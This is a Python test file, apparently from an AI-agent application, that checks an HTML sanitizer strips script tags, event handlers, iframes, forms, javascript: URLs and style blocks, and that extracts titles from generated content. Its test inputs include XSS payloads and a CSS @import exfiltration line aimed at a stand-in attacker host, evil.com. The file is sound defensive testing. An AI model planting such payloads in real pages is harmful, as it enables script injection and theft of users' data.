"""HTML artifact sanitization tests — the security-critical path (§4.3).

Verifies that dangerous HTML (scripts, event handlers, iframes, forms,
javascript: URLs, and CSS-based exfiltration) is stripped before storage.
"""

import pytest

from app.agents.skills.artifact_skill import ArtifactSkill
from app.services.llm_service import LLMService


@pytest.fixture
def skill():
    # LLMService constructor doesn't make network calls, safe to instantiate
    return ArtifactSkill(LLMService(provider="ollama", model="test"))


class TestHtmlSanitization:
    """The _sanitize_html method blocks XSS vectors."""

    def test_strips_script_tags(self, skill):
        html = "<div>Safe</div><script>alert('xss')</script>"
        cleaned, modified = skill._sanitize_html(html)
        assert "<script>" not in cleaned
        assert "alert" not in cleaned
        assert "Safe" in cleaned
        assert modified is True

    def test_strips_event_handlers(self, skill):
        html = '<div onclick="steal()">Click</div>'
        cleaned, _ = skill._sanitize_html(html)
        assert "onclick" not in cleaned
        assert "steal" not in cleaned

    def test_strips_onerror_on_img(self, skill):
        html = '<img src="x" onerror="alert(1)">'
        cleaned, _ = skill._sanitize_html(html)
        assert "onerror" not in cleaned

    def test_strips_iframe(self, skill):
        html = '<iframe src="https://evil.com"></iframe><p>text</p>'
        cleaned, _ = skill._sanitize_html(html)
        assert "<iframe" not in cleaned
        assert "text" in cleaned

    def test_strips_form(self, skill):
        html = '<form action="https://evil.com"><input name="pw"></form>'
        cleaned, _ = skill._sanitize_html(html)
        assert "<form" not in cleaned
        assert "<input" not in cleaned

    def test_strips_javascript_url(self, skill):
        html = '<a href="javascript:alert(1)">Link</a>'
        cleaned, _ = skill._sanitize_html(html)
        assert "javascript:" not in cleaned

    def test_strips_style_block_prevents_css_exfiltration(self, skill):
        # <style> blocks are stripped entirely — no @import exfiltration
        html = '<style>@import url("https://evil.com/steal");</style><p>text</p>'
        cleaned, _ = skill._sanitize_html(html)
        assert "@import" not in cleaned
        assert "evil.com" not in cleaned
        assert "text" in cleaned

    def test_preserves_safe_formatting(self, skill):
        html = "<h1>Title</h1><p><strong>Bold</strong> and <em>italic</em></p><ul><li>Item</li></ul>"
        cleaned, _ = skill._sanitize_html(html)
        assert "<h1>" in cleaned
        assert "<strong>" in cleaned
        assert "<em>" in cleaned
        assert "<li>" in cleaned

    def test_preserves_inline_styles(self, skill):
        html = '<div style="color: red; padding: 10px;">Styled</div>'
        cleaned, _ = skill._sanitize_html(html)
        assert "Styled" in cleaned
        # Inline styles allowed via bleach ALLOWED_ATTRIBUTES
        assert "<div" in cleaned

    def test_clean_html_not_modified(self, skill):
        html = "<p>Just a clean paragraph.</p>"
        cleaned, modified = skill._sanitize_html(html)
        assert "clean paragraph" in cleaned
        # A fully clean input should not be flagged as modified
        assert modified is False


class TestTitleExtraction:
    """Title extraction from generated content."""

    def test_extract_markdown_h1(self, skill):
        content = "# My Great Essay\n\nBody text here."
        title = skill._extract_title(content, "markdown", "fallback")
        assert title == "My Great Essay"

    def test_extract_html_title_tag(self, skill):
        content = "<html><head><title>Slide Deck</title></head><body></body></html>"
        title = skill._extract_title(content, "html", "fallback")
        assert title == "Slide Deck"

    def test_extract_html_h1_fallback(self, skill):
        content = "<body><h1>Growth Report</h1></body>"
        title = skill._extract_title(content, "html", "fallback")
        assert title == "Growth Report"

    def test_extract_uses_fallback_when_no_title(self, skill):
        content = "Just plain text with no heading"
        title = skill._extract_title(content, "markdown", "My Prompt Fallback")
        assert title == "My Prompt Fallback"
